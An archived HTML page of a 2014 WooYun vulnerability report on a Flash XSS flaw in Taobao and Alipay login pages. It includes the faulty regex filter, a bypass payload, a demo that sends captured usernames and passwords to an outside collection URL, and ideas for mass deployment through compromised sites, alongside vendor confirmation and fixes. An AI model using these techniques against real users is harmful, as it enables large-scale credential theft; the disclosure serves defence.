@@ -1,0 +1,409 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		一个可大规模悄无声息窃取淘宝/支付宝账号与密码的漏洞 -（埋雷式攻击附带视频演示）  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		一个可大规模悄无声息窃取淘宝/支付宝账号与密码的漏洞 -（埋雷式攻击附带视频演示）  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/gainover">gainover</a> 
+</li><li>提交时间：		2014-02-21 16:21</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-02-21：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-02-26：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-03-08：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-03-18：	细节向普通白帽子公开<br/>
+									2014-03-28：	细节向实习白帽子公开<br/>
+									2014-04-07：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">有些漏洞，如果只是从技术层面来说明问题，厂商似乎感觉不到它的危害。整个漏洞利用过程也录了个视频，奉献给普通网民，厂商努力修，我们网民自己也得增强安全意识，那些抱着“这么大公司不可能有大漏洞”之幻想的网民们该醒醒了。。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1. 此缺陷存在于淘宝网登录页面及支付宝登陆页面。<br />
+<br />
+<br />
+<br />
+两个页面的FLASH文件分别为：<br />
+<br />
+淘宝登录页：<br />
+<br />
+https://acjstb.aliyun.com/flash/JSocket.swf<br />
+<br />
+支付宝登陆页<br />
+<br />
+https://acjs.aliyun.com/flash/JSocket.swf<br />
+<br />
+<br />
+<br />
+2. 此漏洞已经被报告两次，并在第2次做出了修复。<br />
+<br />
+<br />
+<br />
+ <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2013-039481">WooYun: 一个flash的0day导致的淘宝网存储xss(可形成永久后门)</a>  一个flash的0day导致的淘宝网存储xss(可形成永久后门) <br />
+<br />
+<br />
+<br />
+ <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2013-040838">WooYun: 一个flash的0day导致的淘宝网存储xss 【续集】</a>  一个flash的0day导致的淘宝网存储xss 【续集】<br />
+<br />
+<br />
+<br />
+但随后的不知哪次更新中，FLASH文件代码被再次改写，而改写后的代码，过滤上再次出现问题。（安全与开发没互动啊！！）<br />
+<br />
+<br />
+<br />
+缺陷代码如下：<br />
+<br />
+<br />
+<br />
+</p><pre><code>private function getlso():String{<br />
+	var _local1:SharedObject = SharedObject.getLocal(&quot;kj&quot;);<br />
+	var _local2:RegExp = new RegExp(&quot;[\\({]&quot;);<br />
+	if (_local1.data.key == undefined){<br />
+		return (&quot;&quot;);<br />
+	};<br />
+	if (_local2.test(_local1.data.key)){<br />
+		this.setlso(&quot;&quot;);<br />
+		return (&quot;&quot;);<br />
+	};<br />
+	return (_local1.data.key);<br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+可以看到，正则表达式 _local2 仅仅过滤了 ( 和 { ，而正确的过滤方法应该是过滤 \ ，这个我用我的小号在 <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2013-040838">WooYun: 一个flash的0day导致的淘宝网存储xss 【续集】</a>  的修复建议中已经给出该修复建议。<br />
+<br />
+<br />
+<br />
+那么为什么这里还是没过滤 \ 呢？ 原因猜测可能有两种：<br />
+<br />
+<br />
+<br />
+A. 响应漏洞的同学并没看到我的修复建议并转告开发同学。<br />
+<br />
+B. 开发的同学，认为 [\\({] 是 \ , (  和 } 的集合， 而实际上，RegExp方式创建正则表达式时，需要写成 [\\\\({] ，原因是：\在字符串里是转义符，在正则里也是转义符。<br />
+<br />
+<br />
+<br />
+然后， ( 和 { 被过滤后，我们依然可以执行Javascript代码，例如以下代码：<br />
+<br />
+<br />
+<br />
+</p><pre><code>location.href=&quot;javascript:alert%28129&quot;;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+3. 相比之前的帖子，neobytes同学以及我的小号，都未太过于强调此漏洞的危害，neobytes同学得到了8rank，而我的小号索要了8rank，漏洞响应的同学只给了我 5 rank 。。。<br />
+<br />
+<br />
+<br />
+对于此，我只想重复我在漏洞简要描述中的那一句话：“有些漏洞，如果只是从技术层面来说明问题，厂商似乎感觉不到它的危害。”<br />
+<br />
+<br />
+<br />
+4. 这一次，我要证明这个漏洞的危害有多大。 （由于淘宝和支付宝是一样的问题，这里我仅以支付宝做漏洞危害演示！）<br />
+<br />
+<br />
+<br />
+5. 由于以上原因导致产生 FLASH XSS Rookit， 而该FLASH所在的页面是在 淘宝/支付宝的登录页面，换句话说，如果我们的XSS代码是可以监控并记录登录页面上的密码的。说的更直接点，就是利用该 Flash XSS Rookit 来劫持用户登录的表单。<br />
+<br />
+<br />
+<br />
+这里我写了一个简单粗糙的代码，来劫持登录表单，劫持表单的代码的解读我就不说了，直接看演示页面：http://xsst.sinaapp.com/taobao_xss_2014_2_20_abc3fd.htm<br />
+<br />
+<br />
+<br />
+我们打开演示页面,界面如下,很白痴的界面：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/21160157dbae542aafa8a3e4c32f1629fe135f58.jpg" target="_blank"><img src="../images/21160157dbae542aafa8a3e4c32f1629fe135f58.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+进度条很快就加载完了，这说明我们已经在电脑上种植好了flash xss rookit的代码。<br />
+<br />
+<br />
+<br />
+接着，我们打开支付宝的首页: https://www.alipay.com/, 输入帐号和密码<br />
+<br />
+<br />
+<br />
+当我们离开密码框时，我们的rookit代码会将用户所输入的密码记录到全局的 ppp 变量中，如下图所示：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/21160211736090c7de1a08def555945e5fddeaf8.jpg" target="_blank"><img src="../images/21160211736090c7de1a08def555945e5fddeaf8.jpg" alt="2.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+接着，应该是点击 【登录】按钮， 而该登录按钮的 点击事件 被我们所劫持，当用户点击登录时，<br />
+<br />
+<br />
+<br />
+输入框中的用户名，以及存储在全局变量ppp中的密码将被发送至我们的接收页面。<br />
+<br />
+<br />
+<br />
+由于登录页面是https协议，因此我们接受密码的页面也采用 https协议，这里使用的是GAE。<br />
+<br />
+<br />
+<br />
+https://jsfile2012.appspot.com/paypalpoc?data=帐号和密码<br />
+<br />
+<br />
+<br />
+如下图所示是被发送到我们接受也没的帐号与密码：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/2116022272c1304e13506c52046b4e3a2814c8cb.jpg" target="_blank"><img src="../images/2116022272c1304e13506c52046b4e3a2814c8cb.jpg" alt="3.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+随后，登录按钮将会被脚本复原，执行它原本的正常登录功能。可以看到我们正常的登录成功，密码也被记录进入数据库中。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/211602351eb0b2943c4caa733fbbea33fef30dd6.jpg" target="_blank"><img src="../images/211602351eb0b2943c4caa733fbbea33fef30dd6.jpg" alt="4.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+6. 以上是整个窃取密码的过程，为什么说这个漏洞危害大呢？它具有以下特点。<br />
+<br />
+<br />
+<br />
+【危害的说明】 见漏洞证明部分<br />
+<br />
+<br />
+<br />
+7. 上面我只是演示偷取了我自己的小号，接着我们要回到我们标题上的“大规模”。<br />
+<br />
+<br />
+<br />
+当然，我不可能真实的去利用该漏洞偷取很多帐号和密码来证明它，这里只给出一些思路，<br />
+<br />
+<br />
+<br />
+而这些思路，对于有心人来说，都是很容易实现的：<br />
+<br />
+<br />
+<br />
+A. 入侵一些大流量的网站（或者很多个小流量的站），然后iframe隐蔽嵌入上面的漏洞利用页面。大量受害者访问页面后，电脑被种植flash xss rookit。 当受害者下次使用该电脑登录淘宝或支付宝时，帐号密码被发送给黑客。<br />
+<br />
+<br />
+<br />
+B. 利用一些社交网站的XSS来嵌入漏洞利用页面，后面流程与A相同。<br />
+<br />
+<br />
+<br />
+C. 可以利用一些看似很正常的页面，例如百度搜索结果中的一些第三方百度应用。<br />
+<br />
+<br />
+<br />
+D. 如果是在利用代码中，再混杂一些其他网站的XSS来获取受害者信息，危害将会变得更大，简单的例子，QQ的XSS，获取到QQ帐号，而QQ号所使用密码可能与支付宝或淘宝密码相同。<br />
+<br />
+<br />
+<br />
+8. 最后我自己变身为一个受害者，在虚拟机中，将整个受害过程录制成了视频：<br />
+<br />
+<br />
+<br />
+注：视频中所使用的被插入恶意代码的网站域名 www.hao456.com 为虚构的假想网站，在本地环境搭建而成。其次，由于录制视频时，网速较慢，部分加载网页的延时部分被后期剪掉了。<br />
+<br />
+<br />
+<br />
+在线视频：<br />
+<br />
+<embed src="http://static.wooyun.org/files/taobaoxss.swf" type="application/x-shockwave-flash" allowscriptaccess="never" allowfullscreen="true" wmode="opaque" width="480" height="370"></embed><br />
+<br />
+清晰版视频下载： http://static.wooyun.org/files/taobaoxss.wmv </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">由于详细说明中已经给出具体的证明过程，这里强调的是该漏洞的一些特点：<br />
+<br />
+<br />
+<br />
+A. 可以钓取用户的账户和密码信息，相比传统XSS窃取的个人信息更加重要。<br />
+<br />
+B. 相比传统钓鱼，这种在支付宝和淘宝自己登录页面上的钓鱼，对于用户来说无法用认知来防御。<br />
+<br />
+C. 窃取密码的过程隐蔽，用户难以察觉。<br />
+<br />
+D. 窃取手段不会被目前的家用杀毒软件所察觉。<br />
+<br />
+E. 此类XSS攻击，并不像传统XSS需要用户处于登录态。而是随时都可以进行攻击，从而在受害者电脑上种植rookit代码。因而十分易于用来做定向的攻击或者大规模的攻击。<br />
+<br />
+F. 此类XSS攻击，可以长期存在于用户电脑中，持续时间长。<br />
+<br />
+G. 此类XSS完全是跨协议的，即我们种植rookit使用的是http协议下的flash文件，而登录页面中是https协议下的flash文件。<br />
+<br />
+H. 在chrome浏览器中，普通页面下种植的rookit，在隐身模式下登录支付宝一样会被窃取密码。<br />
+<br />
+I. 支付宝的登录控件，并不能防止通过这种攻击所实施的密码窃取 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">1. 修复正则过滤 \ 的问题。 <br />
+<br />
+2. flash代码中的<br />
+<br />
+</p><pre><code>Security.allowDomain(&quot;*&quot;);</code></pre><p class='detail'><br />
+<br />
+  修改为<br />
+<br />
+</p><pre><code>Security.allowDomain(&quot;auth.alipay.com&quot;,&quot;login.taobao.com&quot;);</code></pre><p class='detail'><br />
+<br />
+ <br />
+<br />
+这样一来，就只有 auth.alipay.com 和 login.taobao.com 两个域可以调用flash中addCallback提供的函数接口了。当然这么写要避免 auth.alipay.com 和 login.taobao.com 的域下出现其它XSS漏洞。<br />
+<br />
+ <br />
+<br />
+综合1和2，可以彻底修复此漏洞。<br />
+<br />
+<br />
+<br />
+支付宝网站中使用的FLASH文件不少，说不定其它位置也存在类似问题。<br />
+<br />
+<br />
+<br />
+用户解决这种后门（flash）的办法是：<br />
+<br />
+</p><p class="detail"><a href="../images/15153938ed86a5a8b5d77e96a58961153092ab49.png" target="_blank"><img src="../images/15153938ed86a5a8b5d77e96a58961153092ab49.png" alt="111.png" width="600"/></a></p><p class="detail"> </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/gainover" title="gainover">gainover</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-051615" title="一个可大规模悄无声息窃取淘宝/支付宝账号与密码的漏洞 -（埋雷式攻击附带视频演示）">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2014-02-26 10:25</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢您对阿里巴巴安全的支持</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="51615";
+var bugRating="2";
+var myRating="";
+var ratingCount="7";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
